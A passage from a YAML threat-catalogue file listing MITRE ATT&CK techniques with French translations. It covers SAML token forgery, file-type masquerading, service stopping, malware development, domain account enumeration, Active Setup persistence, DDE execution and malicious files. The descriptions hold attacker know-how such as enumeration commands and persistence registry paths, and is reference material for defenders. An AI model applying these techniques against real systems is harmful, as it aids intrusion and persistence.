          \ : Cyberark Golden SAML)\n\nUn adversaire peut utiliser des [Cl\xE9s priv\xE9\
          es](https://attack.mitre.org/techniques/T1552/004) pour compromettre le\
          \ certificat de signature de jeton d'une organisation afin de cr\xE9er des\
          \ jetons SAML falsifi\xE9s. Si l'adversaire dispose de suffisamment d'autorisations\
          \ pour \xE9tablir un nouveau trust de f\xE9d\xE9ration avec son propre serveur\
          \ Active Directory Federation Services (AD FS), il peut alors g\xE9n\xE9\
          rer son propre certificat de signature de jeton de confiance. (Citation\
          \ : Guide client Microsoft SolarWinds) Cela diff\xE8re de [Steal Application\
          \ Access Token](https://attack.mitre.org/techniques/T1528) et d'autres comportements\
          \ similaires en ce que les jetons sont nouveaux et falsific\xE9s par l'adversaire,\
          \ plut\xF4t que vol\xE9s ou intercept\xE9s aupr\xE8s d'utilisateurs l\xE9\
          gitimes.\n\nUn adversaire peut obtenir des privil\xE8ges administratifs\
          \ d'Entra ID si un jeton SAML est falsifi\xE9 et pr\xE9tend repr\xE9senter\
          \ un compte hautement privil\xE9gi\xE9. Cela peut conduire \xE0 [Utiliser\
          \ Mat\xE9riel d'Authentification Alternatif](https://attack.mitre.org/techniques/T1550),\
          \ qui peut contourner les m\xE9canismes de protection multifactoriels et\
          \ autres. (Citation : Guide client Microsoft SolarWinds) https://attack.mitre.org/techniques/T1606/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1036.008
    ref_id: T1036.008
    name: Masquerade File Type
    description: "Adversaries may masquerade malicious payloads as legitimate files\
      \ through changes to the payload's formatting, including the file\u2019s signature,\
      \ extension, icon, and contents. Various file types have a typical standard\
      \ format, including how they are encoded and organized. For example, a file\u2019\
      s signature (also known as header or magic bytes) is the beginning bytes of\
      \ a file and is often used to identify the file\u2019s type. For example, the\
      \ header of a JPEG file,  is <code> 0xFF 0xD8</code> and the file extension\
      \ is either `.JPE`, `.JPEG` or `.JPG`. \n\nAdversaries may edit the header\u2019\
      s hex code and/or the file extension of a malicious payload in order to bypass\
      \ file validation checks and/or input sanitization. This behavior is commonly\
      \ used when payload files are transferred (e.g., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105))\
      \ and stored (e.g., [Upload Malware](https://attack.mitre.org/techniques/T1608/001))\
      \ so that adversaries may move their malware without triggering detections.\
      \ \n\nCommon non-executable file types and extensions, such as text files (`.txt`)\
      \ and image files (`.jpg`, `.gif`, etc.) may be typically treated as benign.\
      \  Based on this, adversaries may use a file extension to disguise malware,\
      \ such as naming a PHP backdoor code with a file name of <code>test.gif</code>.\
      \ A user may not know that a file is malicious due to the benign appearance\
      \ and file extension.\n\nPolyglot files, which are files that have multiple\
      \ different file types and that function differently based on the application\
      \ that will execute them, may also be used to disguise malicious malware and\
      \ capabilities.(Citation: polygot_icedID)\nhttps://attack.mitre.org/techniques/T1036/008"
    translations:
      fr:
        name: "Type de fichier masqu\xE9"
        description: "Les adversaires peuvent faire passer des charges utiles malveillantes\
          \ pour des fichiers l\xE9gitimes en modifiant la mise en forme de la charge\
          \ utile, y compris la signature, l'extension, l'ic\xF4ne et le contenu du\
          \ fichier. Diff\xE9rents types de fichiers ont un format standard typique,\
          \ y compris la mani\xE8re dont ils sont encod\xE9s et organis\xE9s. Par\
          \ exemple, la signature d'un fichier (\xE9galement appel\xE9e en-t\xEAte\
          \ ou octets magiques) est l'octet de d\xE9but d'un fichier et est souvent\
          \ utilis\xE9e pour identifier le type du fichier. Par exemple, l'en-t\xEA\
          te d'un fichier JPEG est <code> 0xFF 0xD8</code> et l'extension de fichier\
          \ est soit '. JPE', '. JPEG' ou '.JPG'. \n\nLes adversaires peuvent modifier\
          \ le code hexad\xE9cimal de l'en-t\xEAte et/ou l'extension de fichier d'une\
          \ charge utile malveillante afin de contourner les v\xE9rifications de validation\
          \ des fichiers et/ou la salubrisation des entr\xE9es. Ce comportement est\
          \ couramment utilis\xE9 lorsque des fichiers payload sont transf\xE9r\xE9\
          s (par exemple, [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105))\
          \ et stock\xE9s (par exemple, [Upload Malware](https://attack.mitre.org/techniques/T1608/001))\
          \ afin que les adversaires puissent d\xE9placer leur malware sans d\xE9\
          clencher de d\xE9tection. \n\nLes types de fichiers non ex\xE9cutables courants\
          \ et les extensions, tels que les fichiers texte (\xAB .txt \xBB) et les\
          \ fichiers image (\xAB .jpg \xBB, \xAB .gif, etc.) peuvent g\xE9n\xE9ralement\
          \ \xEAtre consid\xE9r\xE9s comme b\xE9nins.  Sur cette base, les adversaires\
          \ peuvent utiliser une extension de fichier pour dissimuler des logiciels\
          \ malveillants, comme nommer un code d\xE9rob\xE9 PHP avec un nom de fichier\
          \ <code>test.gif</code>. Un utilisateur peut ne pas savoir qu'un fichier\
          \ est malveillant en raison de son apparence b\xE9nigne et de son extension.\n\
          \nLes fichiers polyglottes, qui sont des fichiers comportant plusieurs types\
          \ de fichiers diff\xE9rents et fonctionnant diff\xE9remment selon l'application\
          \ qui les ex\xE9cutera, peuvent \xE9galement \xEAtre utilis\xE9s pour dissimuler\
          \ des logiciels malveillants et des capacit\xE9s. (Citation : polygot_icedID)https://attack.mitre.org/techniques/T1036/008"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1489
    ref_id: T1489
    name: Service Stop
    description: "Adversaries may stop or disable services on a system to render those\
      \ services unavailable to legitimate users. Stopping critical services or processes\
      \ can inhibit or stop response to an incident or aid in the adversary's overall\
      \ objectives to cause damage to the environment.(Citation: Talos Olympic Destroyer\
      \ 2018)(Citation: Novetta Blockbuster) \n\nAdversaries may accomplish this by\
      \ disabling individual services of high importance to an organization, such\
      \ as <code>MSExchangeIS</code>, which will make Exchange content inaccessible.(Citation:\
      \ Novetta Blockbuster) In some cases, adversaries may stop or disable many or\
      \ all services to render systems unusable.(Citation: Talos Olympic Destroyer\
      \ 2018) Services or processes may not allow for modification of their data stores\
      \ while running. Adversaries may stop services or processes in order to conduct\
      \ [Data Destruction](https://attack.mitre.org/techniques/T1485) or [Data Encrypted\
      \ for Impact](https://attack.mitre.org/techniques/T1486) on the data stores\
      \ of services like Exchange and SQL Server, or on virtual machines hosted on\
      \ ESXi infrastructure.(Citation: SecureWorks WannaCry Analysis)(Citation: Crowdstrike\
      \ Hypervisor Jackpotting Pt 2 2021)\n\nThreat actors may also disable or stop\
      \ service in cloud environments. For example, by leveraging the `DisableAPIServiceAccess`\
      \ API in AWS, a threat actor may prevent the service from creating service-linked\
      \ roles on new accounts in the AWS Organization.(Citation: Datadog Security\
      \ Labs Cloud Persistence 2025)(Citation: AWS DisableAWSServiceAccess)\nhttps://attack.mitre.org/techniques/T1489"
    translations:
      fr:
        name: "Arr\xEAt de service"
        description: "Les adversaires peuvent arr\xEAter ou d\xE9sactiver des services\
          \ sur un syst\xE8me afin de rendre ces services inaccessibles aux utilisateurs\
          \ l\xE9gitimes. Arr\xEAter des services ou processus critiques peut inhiber\
          \ ou arr\xEAter la r\xE9ponse \xE0 un incident ou aider \xE0 atteindre les\
          \ objectifs globaux de l'adversaire : causer des dommages \xE0 l'environnement.\
          \ (Citation : Talos Olympic Destroyer 2018)(Citation : Blockbuster de Novetta)\
          \ \n\nLes adversaires peuvent y parvenir en d\xE9sactivant des services\
          \ individuels de grande importance pour une organisation, tels que <code>MSExchangeIS</code>,\
          \ ce qui rendra le contenu Exchange inaccessible. (Citation : Blockbuster\
          \ de Novetta) Dans certains cas, les adversaires peuvent arr\xEAter ou d\xE9\
          sactiver de nombreux services voire tous les services pour rendre les syst\xE8\
          mes inutilisables. (Citation : Talos Olympic Destroyer 2018) Les services\
          \ ou processus peuvent ne pas permettre la modification de leurs r\xE9serves\
          \ de donn\xE9es pendant l'ex\xE9cution. Les adversaires peuvent arr\xEA\
          ter des services ou des processus afin de r\xE9aliser [Destruction de donn\xE9\
          es](https://attack.mitre.org/techniques/T1485) ou [Donn\xE9es chiffr\xE9\
          es pour impact](https://attack.mitre.org/techniques/T1486) sur les magasins\
          \ de donn\xE9es de services comme Exchange et SQL Server, ou sur des machines\
          \ virtuelles h\xE9berg\xE9es sur l'infrastructure ESXi. (Citation : Analyse\
          \ SecureWorks WannaCry)(Citation : Crowdstrike Hyperviseur Jackpotting Partie\
          \ 2 2021)\n\nLes acteurs malveillants peuvent \xE9galement d\xE9sactiver\
          \ ou arr\xEAter le service dans les environnements cloud. Par exemple, en\
          \ exploitant l'API \xAB DisableAPIServiceAccess \xBB dans AWS, un acteur\
          \ de menace peut emp\xEAcher le service de cr\xE9er des r\xF4les li\xE9\
          s au service sur de nouveaux comptes dans l'organisation AWS. (Citation\
          \ : Datadog Security Labs Cloud Persistence 2025)(Citation : AWS DisableAWSServiceAccess)https://attack.mitre.org/techniques/T1489"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1587.001
    ref_id: T1587.001
    name: Malware
    description: 'Adversaries may develop malware and malware components that can
      be used during targeting. Building malicious software can include the development
      of payloads, droppers, post-compromise tools, backdoors (including backdoored
      images), packers, C2 protocols, and the creation of infected removable media.
      Adversaries may develop malware to support their operations, creating a means
      for maintaining control of remote machines, evading defenses, and executing
      post-compromise behaviors.(Citation: Mandiant APT1)(Citation: Kaspersky Sofacy)(Citation:
      ActiveMalwareEnergy)(Citation: FBI Flash FIN7 USB)


      During malware development, adversaries may intentionally include indicators
      aligned with other known actors in order to mislead attribution by defenders.(Citation:
      Olympic Destroyer)(Citation: Risky Bulletin Threat actor impersonates FSB APT)(Citation:
      GamaCopy organization)


      As with legitimate development efforts, different skill sets may be required
      for developing malware. The skills needed may be located in-house, or may need
      to be contracted out. Use of a contractor may be considered an extension of
      that adversary''s malware development capabilities, provided the adversary plays
      a role in shaping requirements and maintains a degree of exclusivity to the
      malware.


      Some aspects of malware development, such as C2 protocol development, may require
      adversaries to obtain additional infrastructure. For example, malware developed
      that will communicate with Twitter for C2, may require use of [Web Services](https://attack.mitre.org/techniques/T1583/006).(Citation:
      FireEye APT29)

      https://attack.mitre.org/techniques/T1587/001'
    translations:
      fr:
        name: Malware
        description: "Les adversaires peuvent d\xE9velopper des logiciels malveillants\
          \ et des composants logiciels malveillants qui peuvent \xEAtre utilis\xE9\
          s lors du ciblage. La cr\xE9ation de logiciels malveillants peut inclure\
          \ le d\xE9veloppement de charges utiles, de droppers, d'outils post-compromiss,\
          \ de portes d\xE9rob\xE9es (y compris des images backdoor), de packers,\
          \ de protocoles C2 et la cr\xE9ation de supports amovibles infect\xE9s.\
          \ Les adversaires peuvent d\xE9velopper des logiciels malveillants pour\
          \ soutenir leurs op\xE9rations, cr\xE9ant ainsi un moyen de maintenir le\
          \ contr\xF4le des machines distantes, d'\xE9viter les d\xE9fenses et d'ex\xE9\
          cuter des comportements post-compromis. (Citation : Mandiant APT1)(Citation\
          \ : Kaspersky Sofacy)(Citation : ActiveMalwareEnergy)(Citation : Flash USB\
          \ FIN7 du FBI)\n\nLors du d\xE9veloppement de logiciels malveillants, les\
          \ adversaires peuvent intentionnellement inclure des indicateurs align\xE9\
          s avec d'autres acteurs connus afin de tromper l'attribution par les d\xE9\
          fenseurs. (Citation : Destructeur olympique)(Citation : Acteur de menace\
          \ du Bulletin Risqu\xE9 se fait passer pour FSB APT)(Citation : organisation\
          \ GamaCopy)\n\nComme pour les efforts de d\xE9veloppement l\xE9gitimes,\
          \ des comp\xE9tences diff\xE9rentes peuvent \xEAtre n\xE9cessaires pour\
          \ d\xE9velopper des logiciels malveillants. Les comp\xE9tences requises\
          \ peuvent \xEAtre localis\xE9es en interne ou doivent \xEAtre sous-trait\xE9\
          es. L'utilisation d'un contractuel peut \xEAtre consid\xE9r\xE9e comme une\
          \ extension des capacit\xE9s de d\xE9veloppement de malwares de cet adversaire,\
          \ \xE0 condition que cet adversaire joue un r\xF4le dans l'\xE9laboration\
          \ des exigences et maintienne un certain degr\xE9 d'exclusivit\xE9 vis-\xE0\
          -vis du malware.\n\nCertains aspects du d\xE9veloppement de malwares, comme\
          \ le d\xE9veloppement du protocole C2, peuvent n\xE9cessiter que les adversaires\
          \ obtiennent une infrastructure suppl\xE9mentaire. Par exemple, un logiciel\
          \ malveillant d\xE9velopp\xE9 qui communiquera avec Twitter pour C2 peut\
          \ n\xE9cessiter l'utilisation de [Web Services](https://attack.mitre.org/techniques/T1583/006).\
          \ (Citation : FireEye APT29) https://attack.mitre.org/techniques/T1587/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1652
    ref_id: T1652
    name: Device Driver Discovery
    description: 'Adversaries may attempt to enumerate local device drivers on a victim
      host. Information about device drivers may highlight various insights that shape
      follow-on behaviors, such as the function/purpose of the host, present security
      tools (i.e. [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001))
      or other defenses (e.g., [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497)),
      as well as potential exploitable vulnerabilities (e.g., [Exploitation for Privilege
      Escalation](https://attack.mitre.org/techniques/T1068)).


      Many OS utilities may provide information about local device drivers, such as
      `driverquery.exe` and the `EnumDeviceDrivers()` API function on Windows.(Citation:
      Microsoft Driverquery)(Citation: Microsoft EnumDeviceDrivers) Information about
      device drivers (as well as associated services, i.e., [System Service Discovery](https://attack.mitre.org/techniques/T1007))
      may also be available in the Registry.(Citation: Microsoft Registry Drivers)


      On Linux/macOS, device drivers (in the form of kernel modules) may be visible
      within `/dev` or using utilities such as `lsmod` and `modinfo`.(Citation: Linux
      Kernel Programming)(Citation: lsmod man)(Citation: modinfo man)

      https://attack.mitre.org/techniques/T1652'
    translations:
      fr:
        name: "D\xE9couverte des pilotes de p\xE9riph\xE9rique"
        description: "Les adversaires peuvent tenter d'\xE9num\xE9rer les pilotes\
          \ de p\xE9riph\xE9riques locaux sur un h\xF4te victime. Les informations\
          \ sur les pilotes de p\xE9riph\xE9riques peuvent mettre en lumi\xE8re diverses\
          \ informations qui fa\xE7onnent les comportements ult\xE9rieurs, tels que\
          \ la fonction/l'objectif de l'h\xF4te, les outils de s\xE9curit\xE9 actuels\
          \ (par exemple [D\xE9couverte de logiciels de s\xE9curit\xE9](https://attack.mitre.org/techniques/T1518/001))\
          \ ou d'autres d\xE9fenses (par exemple, [Virtualisation/\xC9vasion bac \xE0\
          \ sable](https://attack.mitre.org/techniques/T1497)), ainsi que des vuln\xE9\
          rabilit\xE9s potentielles exploitables (par exemple, [Exploitation pour\
          \ l'escalade de privil\xE8ges](https://attack.mitre.org/techniques/T1068)).\n\
          \nDe nombreux utilitaires d'OS peuvent fournir des informations sur les\
          \ pilotes de p\xE9riph\xE9riques locaux, tels que \xAB driverquery.exe \xBB\
          \ et la fonction API \xAB EnumDeviceDrivers()\_\xBB sous Windows. (Citation\
          \ : Microsoft Driverquery)(Citation : Microsoft EnumDeviceDrivers) Des informations\
          \ sur les pilotes de p\xE9riph\xE9riques (ainsi que les services associ\xE9\
          s, c'est-\xE0-dire [D\xE9couverte de Service Syst\xE8me](https://attack.mitre.org/techniques/T1007))\
          \ peuvent \xE9galement \xEAtre disponibles dans le Registre. (Citation :\
          \ Pilotes du registre Microsoft)\n\nSous Linux/macOS, les pilotes de p\xE9\
          riph\xE9riques (sous forme de modules du noyau) peuvent \xEAtre visibles\
          \ dans \xAB /dev \xBB ou en utilisant des utilitaires tels que \xAB lsmod\
          \ \xBB et \xAB modinfo \xBB. (Citation : Programmation du noyau Linux)(Citation\
          \ : lsmod man)(Citation : modinfo man) https://attack.mitre.org/techniques/T1652"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1087.002
    ref_id: T1087.002
    name: Domain Account
    description: 'Adversaries may attempt to get a listing of domain accounts. This
      information can help adversaries determine which domain accounts exist to aid
      in follow-on behavior such as targeting specific accounts which possess particular
      privileges.


      Commands such as <code>net user /domain</code> and <code>net group /domain</code>
      of the [Net](https://attack.mitre.org/software/S0039) utility, <code>dscacheutil
      -q group</code> on macOS, and <code>ldapsearch</code> on Linux can list domain
      users and groups. [PowerShell](https://attack.mitre.org/techniques/T1059/001)
      cmdlets including <code>Get-ADUser</code> and <code>Get-ADGroupMember</code>
      may enumerate members of Active Directory groups.(Citation: CrowdStrike StellarParticle
      January 2022)

      https://attack.mitre.org/techniques/T1087/002'
    translations:
      fr:
        name: Compte de domaine
        description: "Les adversaires peuvent tenter d'obtenir une liste des comptes\
          \ de domaines. Ces informations peuvent aider les adversaires \xE0 d\xE9\
          terminer quels comptes de domaine existent pour favoriser des comportements\
          \ ult\xE9rieurs, comme cibler des comptes sp\xE9cifiques disposant de privil\xE8\
          ges particuliers.\n\nDes commandes telles que <code>net user /domain</code>\
          \ et <code>net group /domain</code> de l'utilitaire [Net](https://attack.mitre.org/software/S0039),\
          \ <code>dscacheutil -q group</code> sur macOS, et <code>ldapsearch</code>\
          \ sur Linux peuvent lister les utilisateurs et groupes de domaines. [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
          \ les cmdlets incluant <code>Get-ADUser</code> et <code>Get-ADGroupMember</code>\
          \ peuvent \xE9num\xE9rer les membres des groupes Active Directory. (Citation\
          \ : CrowdStrike StellarParticle janvier 2022)https://attack.mitre.org/techniques/T1087/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1547.014
    ref_id: T1547.014
    name: Active Setup
    description: 'Adversaries may achieve persistence by adding a Registry key to
      the Active Setup of the local machine. Active Setup is a Windows mechanism that
      is used to execute programs when a user logs in. The value stored in the Registry
      key will be executed after a user logs into the computer.(Citation: Klein Active
      Setup 2010) These programs will be executed under the context of the user and
      will have the account''s associated permissions level.


      Adversaries may abuse Active Setup by creating a key under <code> HKLM\SOFTWARE\Microsoft\Active
      Setup\Installed Components\</code> and setting a malicious value for <code>StubPath</code>.
      This value will serve as the program that will be executed when a user logs
      into the computer.(Citation: Mandiant Glyer APT 2010)(Citation: Citizenlab Packrat
      2015)(Citation: FireEye CFR Watering Hole 2012)(Citation: SECURELIST Bright
      Star 2015)(Citation: paloalto Tropic Trooper 2016)


      Adversaries can abuse these components to execute malware, such as remote access
      tools, to maintain persistence through system reboots. Adversaries may also
      use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry
      entries look as if they are associated with legitimate programs.

      https://attack.mitre.org/techniques/T1547/014'
    translations:
      fr:
        name: Installation active
        description: "Les adversaires peuvent obtenir la persistance en ajoutant une\
          \ cl\xE9 de registre \xE0 la configuration active de la machine locale.\
          \ La configuration active est un m\xE9canisme Windows utilis\xE9 pour ex\xE9\
          cuter des programmes lorsqu'un utilisateur se connecte. La valeur stock\xE9\
          e dans la cl\xE9 du Registre sera ex\xE9cut\xE9e apr\xE8s qu'un utilisateur\
          \ se soit connect\xE9 \xE0 l'ordinateur. (Citation : Klein Active Setup\
          \ 2010) Ces programmes seront ex\xE9cut\xE9s dans le contexte de l'utilisateur\
          \ et auront le niveau d'autorisation associ\xE9 au compte.\n\nLes adversaires\
          \ peuvent abuser de la configuration active en cr\xE9ant une cl\xE9 sous\
          \ <code> HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\\
          </code> et en d\xE9finissant une valeur malveillante pour <code>StubPath</code>.\
          \ Cette valeur servira de programme qui sera ex\xE9cut\xE9 lorsqu'un utilisateur\
          \ se connectera \xE0 l'ordinateur. (Citation : Mandiant Glyer APT 2010)(Citation\
          \ : Citizenlab Packrat 2015)(Citation : FireEye CFR Watering Hole 2012)(Citation\
          \ : SECURELIST Bright Star 2015)(Citation : paloalto Tropic Trooper 2016)\n\
          \nLes adversaires peuvent exploiter ces composants pour ex\xE9cuter des\
          \ logiciels malveillants, tels que des outils d'acc\xE8s \xE0 distance,\
          \ afin de maintenir la persistance lors des red\xE9marrages du syst\xE8\
          me. Les adversaires peuvent \xE9galement utiliser [Masquerading](https://attack.mitre.org/techniques/T1036)\
          \ pour faire para\xEEtre les entr\xE9es du Registre associ\xE9es \xE0 des\
          \ programmes l\xE9gitimes.https\_://attack.mitre.org/techniques/T1547/014"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1564
    ref_id: T1564
    name: Hide Artifacts
    description: 'Adversaries may attempt to hide artifacts associated with their
      behaviors to evade detection. Operating systems may have features to hide various
      artifacts, such as important system files and administrative task execution,
      to avoid disrupting user work environments and prevent users from changing files
      or features on the system. Adversaries may abuse these features to hide artifacts
      such as files, directories, user accounts, or other system activity to evade
      detection.(Citation: Sofacy Komplex Trojan)(Citation: Cybereason OSX Pirrit)(Citation:
      MalwareBytes ADS July 2015)


      Adversaries may also attempt to hide artifacts associated with malicious behavior
      by creating computing regions that are isolated from common security instrumentation,
      such as through the use of virtualization technology.(Citation: Sophos Ragnar
      May 2020)

      https://attack.mitre.org/techniques/T1564'
    translations:
      fr:
        name: Cacher les artefacts
        description: "Les adversaires peuvent tenter de dissimuler des artefacts associ\xE9\
          s \xE0 leurs comportements pour \xE9chapper \xE0 la d\xE9tection. Les syst\xE8\
          mes d'exploitation peuvent disposer de fonctionnalit\xE9s pour masquer divers\
          \ artefacts, tels que des fichiers syst\xE8me importants et l'ex\xE9cution\
          \ de t\xE2ches administratives, afin d'\xE9viter de perturber les environnements\
          \ de travail des utilisateurs et d'emp\xEAcher les utilisateurs de modifier\
          \ des fichiers ou des fonctionnalit\xE9s sur le syst\xE8me. Les adversaires\
          \ peuvent abuser de ces fonctionnalit\xE9s pour dissimuler des artefacts\
          \ tels que des fichiers, des r\xE9pertoires, des comptes utilisateurs ou\
          \ d'autres activit\xE9s syst\xE8me afin d'\xE9chapper \xE0 la d\xE9tection.\
          \ (Citation : Sofacy Komplex Trojan)(Citation : Cybereason OSX Pirrit)(Citation\
          \ : MalwareBytes ADS juillet 2015)\n\nLes adversaires peuvent \xE9galement\
          \ tenter de dissimuler les artefacts associ\xE9s \xE0 un comportement malveillant\
          \ en cr\xE9ant des zones informatiques isol\xE9es des instruments de s\xE9\
          curit\xE9 courants, par exemple gr\xE2ce \xE0 l'utilisation de technologies\
          \ de virtualisation. (Citation : Sophos Ragnar mai 2020) https://attack.mitre.org/techniques/T1564"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1559.002
    ref_id: T1559.002
    name: Dynamic Data Exchange
    description: 'Adversaries may use Windows Dynamic Data Exchange (DDE) to execute
      arbitrary commands. DDE is a client-server protocol for one-time and/or continuous
      inter-process communication (IPC) between applications. Once a link is established,
      applications can autonomously exchange transactions consisting of strings, warm
      data links (notifications when a data item changes), hot data links (duplications
      of changes to a data item), and requests for command execution.


      Object Linking and Embedding (OLE), or the ability to link data between documents,
      was originally implemented through DDE. Despite being superseded by [Component
      Object Model](https://attack.mitre.org/techniques/T1559/001), DDE may be enabled
      in Windows 10 and most of Microsoft Office 2016 via Registry keys.(Citation:
      BleepingComputer DDE Disabled in Word Dec 2017)(Citation: Microsoft ADV170021
      Dec 2017)(Citation: Microsoft DDE Advisory Nov 2017)


      Microsoft Office documents can be poisoned with DDE commands, directly or through
      embedded files, and used to deliver execution via [Phishing](https://attack.mitre.org/techniques/T1566)
      campaigns or hosted Web content, avoiding the use of Visual Basic for Applications
      (VBA) macros.(Citation: SensePost PS DDE May 2016)(Citation: Kettle CSV DDE
      Aug 2014)(Citation: Enigma Reviving DDE Jan 2018)(Citation: SensePost MacroLess
      DDE Oct 2017) Similarly, adversaries may infect payloads to execute applications
      and/or commands on a victim device by way of embedding DDE formulas within a
      CSV file intended to be opened through a Windows spreadsheet program.(Citation:
      OWASP CSV Injection)(Citation: CSV Excel Macro Injection )


      DDE could also be leveraged by an adversary operating on a compromised machine
      who does not have direct access to a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).
      DDE execution can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021)
      such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003)
      (DCOM).(Citation: Fireeye Hunting COM June 2019)

      https://attack.mitre.org/techniques/T1559/002'
    translations:
      fr:
        name: "\xC9change dynamique de donn\xE9es"
        description: "Les adversaires peuvent utiliser Windows Dynamic Data Exchange\
          \ (DDE) pour ex\xE9cuter des commandes arbitraires. DDE est un protocole\
          \ client-serveur pour la communication inter-processus (IPC) unique et/ou\
          \ continue entre applications. Une fois un lien \xE9tabli, les applications\
          \ peuvent \xE9changer de mani\xE8re autonome des transactions compos\xE9\
          es de cha\xEEnes de caract\xE8res, de liens de donn\xE9es chauds (notifications\
          \ lorsqu'un \xE9l\xE9ment de donn\xE9es change), de liens de donn\xE9es\
          \ chauds (duplications de modifications d'un \xE9l\xE9ment de donn\xE9es)\
          \ et de demandes d'ex\xE9cution de commandes.\n\nLa liaison et l'int\xE9\
          gration d'objets (OLE), ou la capacit\xE9 de lier des donn\xE9es entre documents,\
          \ a \xE9t\xE9 initialement mise en \u0153uvre via DDE. Bien qu'il ait \xE9\
          t\xE9 remplac\xE9 par [Component Object Model](https://attack.mitre.org/techniques/T1559/001),\
          \ le DDE peut \xEAtre activ\xE9 dans Windows 10 et la plupart de Microsoft\
          \ Office 2016 via des cl\xE9s du registre. (Citation : BleepingComputer\
          \ DDE d\xE9sactiv\xE9 dans Word d\xE9cembre 2017)(Citation : Microsoft ADV170021\
          \ d\xE9c. 2017)(Citation : Microsoft DDE Advisory nov. 2017)Les \n\ndocuments\
          \ Microsoft Office peuvent \xEAtre empoisonn\xE9s par des commandes DDE,\
          \ directement ou via des fichiers int\xE9gr\xE9s, et utilis\xE9s pour ex\xE9\
          cuter via des campagnes [Phishing](https://attack.mitre.org/techniques/T1566)\
          \ ou du contenu Web h\xE9berg\xE9, \xE9vitant ainsi l'utilisation des macros\
          \ Visual Basic for Applications (VBA). (Citation : SensePost PS DDE mai\
          \ 2016)(Citation : Kettle CSV DDE ao\xFBt 2014)(Citation : Enigma Reviving\
          \ DDE janvier 2018)(Citation : SensePost MacroLess DDE oct. 2017) De m\xEA\
          me, les adversaires peuvent infecter des charges utiles pour ex\xE9cuter\
          \ des applications et/ou des commandes sur un appareil victime en int\xE9\
          grant des formules DDE dans un fichier CSV destin\xE9 \xE0 \xEAtre ouvert\
          \ via un tableur Windows. (Citation : Injection de CSV OWASP)(Citation :\
          \ CSV Excel Macro Injection)\n\nLa DDE pourrait \xE9galement \xEAtre exploit\xE9\
          e par un adversaire op\xE9rant sur une machine compromise qui n'a pas acc\xE8\
          s direct \xE0 un [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).\
          \ L'ex\xE9cution de DDE peut \xEAtre invoqu\xE9e \xE0 distance via [Services\
          \ distants](https://attack.mitre.org/techniques/T1021) tels que [Distributed\
          \ Component Object Model](https://attack.mitre.org/techniques/T1021/003)\
          \ (DCOM). (Citation : Fireeye Hunting COM juin 2019) https://attack.mitre.org/techniques/T1559/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1204.002
    ref_id: T1204.002
    name: Malicious File
    description: "An adversary may rely upon a user opening a malicious file in order\
      \ to gain execution. Users may be subjected to social engineering to get them\
      \ to open a file that will lead to code execution. This user action will typically\
      \ be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001).\
      \ Adversaries may use several types of files that require a user to execute\
      \ them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, .cpl, .reg,\
      \ and .iso.(Citation: Mandiant Trojanized Windows 10)\n\nAdversaries may employ\
      \ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036)\
      \ and [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027)\
      \ to increase the likelihood that a user will open and successfully execute\
      \ a malicious file. These methods may include using a familiar naming convention\
      \ and/or password protecting the file and supplying instructions to a user on\
      \ how to open it.(Citation: Password Protected Word Docs) \n\nWhile [Malicious\
      \ File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly\
      \ after Initial Access it may occur at other phases of an intrusion, such as\
      \ when an adversary places a file in a shared directory or on a user's desktop\
      \ hoping that a user will click on it. This activity may also be seen shortly\
      \ after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).\n\
      https://attack.mitre.org/techniques/T1204/002"
    translations:
      fr:
        name: Fichier malveillant
        description: "Un adversaire peut compter sur l'ouverture d'un fichier malveillant\
          \ par un utilisateur afin d'obtenir son ex\xE9cution. Les utilisateurs peuvent\
          \ \xEAtre soumis \xE0 l'ing\xE9nierie sociale pour les forcer \xE0 ouvrir\
          \ un fichier qui m\xE8nera \xE0 l'ex\xE9cution du code. Cette action utilisateur\
          \ sera g\xE9n\xE9ralement observ\xE9e comme un comportement de suivi \xE0\
          \ partir de [Joint Spearphishing](https://attack.mitre.org/techniques/T1566/001).\
          \ Les adversaires peuvent utiliser plusieurs types de fichiers n\xE9cessitant\
          \ qu'un utilisateur les ex\xE9cute, notamment .doc, .pdf, .xls, .rtf, .scr,\
          \ .exe, .lnk, .pif, .cpl, .reg, et .iso. (Citation : Mandiant trojanis\xE9\
          \ Windows 10)\n\nLes adversaires peuvent utiliser diverses formes de [Masquerading](https://attack.mitre.org/techniques/T1036)\
          \ et [Fichiers ou informations obscurciss\xE9s](https://attack.mitre.org/techniques/T1027)\
          \ pour augmenter la probabilit\xE9 qu'un utilisateur ouvre et ex\xE9cute\
          \ avec succ\xE8s un fichier malveillant. Ces m\xE9thodes peuvent inclure\
          \ l'utilisation d'une convention de nommage famili\xE8re et/ou la protection\
          \ du fichier par mot de passe, ainsi que la fourniture d'instructions \xE0\
          \ l'utilisateur sur la mani\xE8re de l'ouvrir. (Citation : Documents Word\
          \ prot\xE9g\xE9s par mot de passe) \n\nBien que [Fichier malveillant](https://attack.mitre.org/techniques/T1204/002)\
          \ survienne fr\xE9quemment peu apr\xE8s l'acc\xE8s initial, il peut survenir\
          \ \xE0 d'autres phases d'une intrusion, comme lorsqu'un adversaire place\
          \ un fichier dans un dossier partag\xE9 ou sur le bureau d'un utilisateur\
          \ en esp\xE9rant qu'un utilisateur clique dessus. Cette activit\xE9 peut\
